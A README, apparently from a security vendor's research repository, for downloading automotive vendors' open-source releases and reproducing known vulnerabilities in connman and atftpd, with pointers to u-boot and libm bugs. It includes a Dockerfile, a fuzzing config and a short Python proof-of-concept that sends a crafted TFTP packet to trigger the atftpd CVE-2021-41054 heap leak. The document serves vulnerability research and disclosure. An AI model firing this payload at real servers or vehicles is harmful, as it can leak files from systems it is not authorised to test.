# Download automotive OSS

This is a simple script to download OSS from various automotive vendors.
Vendors must provide the OSS software in order to comply with their OSS license
obligations. 

Obligatory note: the presence of a vulnerable OSS version from a vendor does
not necessarily mean that OSS version is still running on automobiles. You will
need to determine that for yourself.

Once you've downloaded the files, you will need to extract them manually.  Be
warned this can create a lot of data -- 35GB on my system.  once you've
extracted, you can start playing around with the software to find new
vulnerabilities and to reproduce 1-days. 

Example use cases below.

## connman (aka the Tesla Hack) CVE-2021-26676

CVSS Score: 9.8

In 2021 security researchers Ralf-Philipp Weinmann and Benedikt Schmotzle [exploited](https://kunnamon.io/tbone/) a Tesla using a zero day in `connman` found with fuzzing. `connman` is an open source network manager that provides WIFI and bluetooth support, and versions up through 1.39 are vulenrable ([CVE-2021-26676](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-26676)).

![Tesla Drone Hack](./media/drone_hacks_tesla_and_opens_its_doors.gif)

Credit:
[youtube](https://www.youtube.com/watch?v=QIBvJk-eT5k&ab_channel=TorqueNews))

The [connman](./connman) directory shows how to reproduce this. 

### Mayhem Analysis

## atftpd CVE-2021-41054

CVSS Score: 7.5 (High)

`aftptd` ([homepage](https://sourceforge.net/projects/atftp/)) is an open source TFTP daemon, and versions through 0.7.4 are vulnerable to buffer overflow [CVE-2021-41054](https://nvd.nist.gov/vuln/detail/CVE-2021-41054). The vulnerability was found by Mayhem on August 4, 2021 while analyzing `atftpd` found in OSS automotive software, and then again in September 2021 independently by [Andreas Mundt](https://sourceforge.net/p/atftp/code/ci/d255bf90834fb45be52decf9bc0b4fb46c90f205/).

### Mayhem Analysis

The directory [atftpd-cve-2021-41054](./atftpd-cve-2021-41054/) has all the information you need to reproduce the vulnerability and create a POC exploit yourself. First, create a docker image yourself or use our pre-built image on Dockerhub at `forallsecure/atftpd-cve-2021-41054`.

```
  FROM debian:bullseye-slim
  RUN apt-get update && apt-get install -y build-essential libc6-dbg
  WORKDIR /build/atftp-0.7.1/
  COPY . .
  RUN   ./configure --prefix=/usr --disable-dependency-tracking --disable-libpcre --disable-libreadline --enable-libwrap && \
    make 'CFLAGS=-g -DHAVE_ARGZ -fgnu89-inline' && \
    make install && \
    mkdir -p /srv/tftp
  CMD "/usr/sbin/atftpd --daemon --no-fork /srv/tftp/"
```

Second, run Mayhem using this [Mayhemfile](./atftpd-cve-2021-41054/Mayhemfile). In this case, we tell Mayhem to analyze the server on UDP port 8069. We also enable the more sensitive analysis with the `advanced_triage` flag. While this flag does add another step in analysis, it also means Mayhem finds the vulnerability much quicker.

```
project: atftpd
target: atftpd
image: forallsecure/atftpd-cve-2021-41054:latest
advanced_triage: true

cmds:
- cmd: /usr/sbin/atftpd --no-fork --daemon --port 8069  /srv/tftp/
  network:
     client: false
     timeout: 10.0
     url: udp://localhost:8069
```

We initially found the zero day in about 2 minutes, 47 seconds with `advanced_triage` enabled, and 12 wall clock hours (about 56 multi-core CPU hours) with `advanced_triage` disabled. If you're running this yourself, expect it to take a few minutes to find the initial first test case. Remember: we're not giving it a set of initial test vectors, so Mayhem has to pull everything out of thin air.

### Technical details

The function `tftp_send_oack` calculates a buffer length incorrectly, which is then passed to `Strncpy`. When the buffer length is too small, the resulting calculation is a large unsigned int into a heap buffer.

- It's trivial for an unauthenticated user to use this for a heartbleed-style information leak without crashing the program. You can even leak file contents!
- In some circumstances, it may be possible to do a remote control flow hijack.
- The fix applied in commit d255bf9 does not change `tftp_send_oack`, but instead validates that calls to it will never have buffer sizes that are too small.

### Proof of concept

Mayhem creates a POC, which you can download via the UI or CLI. In addition, here is a short python script that demonstrates the problem:

```python
blksize = 18
password = b"AAABBBCCCDDDEEEFFFGGGHHHIIIJJJKKKLLLMMMNNNOOOPPP"
filename = b"testfile"

msg = ( b"\x00\x01" # read request
+ filename + b"\x00"
+ b"octet\x00" # mode
+ b"blksize\x00" + str(blksize).encode('ascii') + b"\x00"
+ b"password\x00" + password + b"\x00"
)

import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.sendto(msg, ("192.168.151.128", 1234))
print(repr(sock.recvfrom(1024)))
```

## Other vulnerabilities

Note that all the above are also likely vulnerable to other vulnerabilities found in Mayhem, including:

- uboot CVE-2019-13103, CVE-2019-13104, CVE-2019-13105, CVE-2019-13106 (see https://github.com/ForAllSecure/VulnerabilitiesLab/tree/master/uboot-cve-2019-13103-13106). u-boot is widely used in automotive, including many (and possible all) of the images above. The above vulnerability would allow attackers to gain full root to an ECU during boot.
- GNU libm [CVE-2020-10029](https://github.com/ForAllSecure/VulnerabilitiesLab/tree/master/libm-cve-2020-10029). libm is distributed with glibc, which is necessary to run virtually anything on Linux. There is a stack-based buffer overflow in trigonometric functions like `sin` and `cos` when operating on double-precision floating point numbers.

(Note this repo is for illustrative purposes only, and is not a complete list of vulnerable automobile software versions or vulnerabilities in automobiles.)


